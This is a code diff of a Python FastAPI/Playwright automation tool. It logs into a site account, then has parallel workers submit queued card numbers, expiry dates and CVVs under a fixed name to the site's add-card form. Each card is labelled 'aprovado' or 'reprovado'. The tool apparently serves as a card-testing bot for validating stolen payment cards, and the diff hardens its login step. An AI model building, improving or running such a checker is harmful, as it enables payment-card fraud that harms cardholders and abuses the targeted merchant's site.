@@ -252,16 +252,42 @@ async def login_mestre(playwright, app: FastAPI) -> bool:
             return False
 
         log(app, "[Auth] Login completo (Modo Full)...")
+        # Altere para headless=False se quiser acompanhar visualmente a automação
         browser = await playwright.chromium.launch(headless=True, args=BROWSER_ARGS)
         context = await browser.new_context(viewport=VIEWPORT, user_agent=USER_AGENT)
         page = await context.new_page()
         page.on("dialog", lambda d: asyncio.create_task(d.accept()))
 
         await page.goto(URL_LOGIN, wait_until="domcontentloaded", timeout=60000)
-        await page.get_by_role("textbox", name="672aaef2d67e0ed317e8eea1f049339f").fill(EMAIL)
-        await page.get_by_role("textbox", name="664d478300232207e85e5d04b96e1918").fill(SENHA)
-        await page.get_by_role("button", name="6babcc7b419ee9c279e71209054bdce5").click()
-        await page.wait_for_selector("text=Meus Cartões", timeout=30000)
+        
+        # Seletores robustos para garantir o preenchimento correto dos inputs
+        try:
+            email_input = page.locator("input[type='email'], input[name*='email'], input[name*='user'], input[placeholder*='E-mail'], input[placeholder*='CPF']").first
+            await email_input.fill(EMAIL, timeout=10000)
+        except Exception:
+            logger.exception("Não foi possível preencher o campo de e-mail/CPF")
+            raise
+
+        try:
+            senha_input = page.locator("input[type='password'], input[name*='senha'], input[name*='pass']").first
+            await senha_input.fill(SENHA, timeout=10000)
+        except Exception:
+            logger.exception("Não foi possível preencher o campo de senha")
+            raise
+
+        try:
+            btn_entrar = page.locator("button:has-text('Entrar'), button[type='submit'], input[type='submit']").first
+            await btn_entrar.click(timeout=10000)
+        except Exception:
+            logger.exception("Não foi possível clicar no botão Entrar")
+            raise
+
+        try:
+            await page.wait_for_selector("text=Meus Cartões", timeout=30000)
+        except Exception:
+            await page.screenshot(path="erro_login.png", full_page=True)
+            log(app, "[ERRO] Login não concluiu a tempo. Print salvo em 'erro_login.png'.")
+            raise
 
         await limpar_cartoes(page, app)
         await context.storage_state(path=str(SESSAO_PATH))
@@ -314,20 +340,17 @@ async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> s
         await page.goto(URL_MEUS_CARTOES, wait_until="domcontentloaded", timeout=30000)
         await asyncio.sleep(random.uniform(0.4, 1.0))
 
-        # Detecta sessão expirada (redirecionado para login)
         url_atual = page.url
         if "login" in url_atual.lower() or URL_MEUS_CARTOES not in url_atual:
             logger.warning("Sessão expirada! URL atual: %s", url_atual)
             return "erro:sessao_expirada"
 
-        # Botão de adicionar cartão
         btn_adicionar = page.get_by_role("button", name="Adicionar Cartão de Crédito")
         if not await btn_adicionar.count():
             return "erro:botao_adicionar_nao_encontrado"
         await btn_adicionar.click(force=True, timeout=_TIMEOUT)
         await asyncio.sleep(0.5)
 
-        # Preenchimento do formulário
         try:
             await page.get_by_role("textbox", name="Número do cartão").fill(numero, timeout=_TIMEOUT)
             await page.get_by_role("textbox", name="Nome impresso no cartão").fill(NOME_FIXO, timeout=_TIMEOUT)
@@ -351,7 +374,6 @@ async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> s
 
         botoes_antes = await page.get_by_role("button", name="Remover").count()
 
-        # Clique no botão registrar — sem force=True para não bypassar JS events
         try:
             btn_registrar = page.get_by_role("button", name="Registrar Cartão de Crédito")
             await btn_registrar.scroll_into_view_if_needed(timeout=_TIMEOUT)
@@ -359,11 +381,10 @@ async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> s
         except Exception:
             return "erro:botao_registrar"
 
-        # Aguarda rede estabilizar após o clique
         try:
             await page.wait_for_load_state("networkidle", timeout=5000)
         except Exception:
-            pass  # Continua mesmo se networkidle demorar
+            pass
 
         url_pos_registro = page.url
 
@@ -371,7 +392,6 @@ async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> s
             if estado.cancelado:
                 return "cancelado"
 
-            # Se a página navegou após o registro, analisa a nova URL
             url_atual = page.url
             if url_atual != url_pos_registro:
                 if "sucesso" in url_atual.lower() or "confirmacao" in url_atual.lower():
@@ -382,15 +402,12 @@ async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> s
             if botoes_atual > botoes_antes:
                 return "aprovado"
 
-            # Detecta se o modal/formulário fechou (form sumiu = algo aconteceu)
             form_ainda_aberto = await page.get_by_role("textbox", name="Número do cartão").count() > 0
             if not form_ainda_aberto:
-                # Modal fechou — verifica resultado agora
                 await asyncio.sleep(0.3)
                 botoes_apos = await page.get_by_role("button", name="Remover").count()
                 if botoes_apos > botoes_antes:
                     return "aprovado"
-                # Modal fechou mas sem novo cartão = reprovado ou erro silencioso
                 try:
                     erros = page.locator(
                         ".alert, .toast, .notification, [role='alert'], "
@@ -408,7 +425,6 @@ async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> s
                 return "reprovado"
 
             try:
-                # Seletores amplos: cobre Bootstrap, SweetAlert2, Vuetify, Notyf, etc.
                 erros = page.locator(
                     ".alert, .toast, .notification, [role='alert'], "
                     ".swal2-popup, .noty_body, .v-snackbar__content, "
@@ -426,7 +442,6 @@ async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> s
 
             await asyncio.sleep(0.5)
 
-        # Captura texto da página para diagnóstico no timeout
         try:
             corpo = (await page.locator("body").inner_text())[:300].replace("\n", " ")
             logger.warning("Timeout! URL: %s | Corpo: %s", page.url, corpo)
@@ -438,7 +453,6 @@ async def processar_cartao(page, numero: str, mes: str, ano: str, cvv: str) -> s
         return f"erro:{type(exc).__name__}"
 
 async def _criar_contexto_worker(browser):
-    """Cria um novo contexto e página para um worker."""
     context = await browser.new_context(
         storage_state=str(SESSAO_PATH),
         viewport=VIEWPORT,
@@ -478,7 +492,6 @@ async def worker(id_worker: int, browser, fila: asyncio.Queue, app: FastAPI) -> 
 
                 numero, mes, ano, cvv = partes
 
-                # Validação rápida antes de usar o browser
                 erro_validacao = validar_cartao(numero, mes, ano, cvv)
                 if erro_validacao:
                     log(app, f"[Canal {id_worker}][{indice}] ❌ {erro_validacao}")
@@ -491,7 +504,6 @@ async def worker(id_worker: int, browser, fila: asyncio.Queue, app: FastAPI) -> 
                 try:
                     resultado = await processar_cartao(page, numero, mes, ano, cvv)
                 except Exception:
-                    # Page crashou — recriar context e page
                     logger.exception("[Canal %s] Page crash, recriando...", id_worker)
                     log(app, f"[Canal {id_worker}] ⚠️ Recriando contexto...")
                     try:
@@ -500,7 +512,6 @@ async def worker(id_worker: int, browser, fila: asyncio.Queue, app: FastAPI) -> 
                     except Exception:
                         pass
                     context, page = await _criar_contexto_worker(browser)
-                    # Re-enfileirar o cartão para retry
                     await fila.put((indice, linha, tentativa))
                     continue
 
@@ -666,7 +677,6 @@ async def websocket_endpoint(websocket: WebSocket):
     try:
         while True:
             data = await websocket.receive_text()
-            # Cliente pode enviar pong ou outros comandos
     except WebSocketDisconnect:
         logger.info("WebSocket desconectado: %s", websocket.client)
     except Exception:
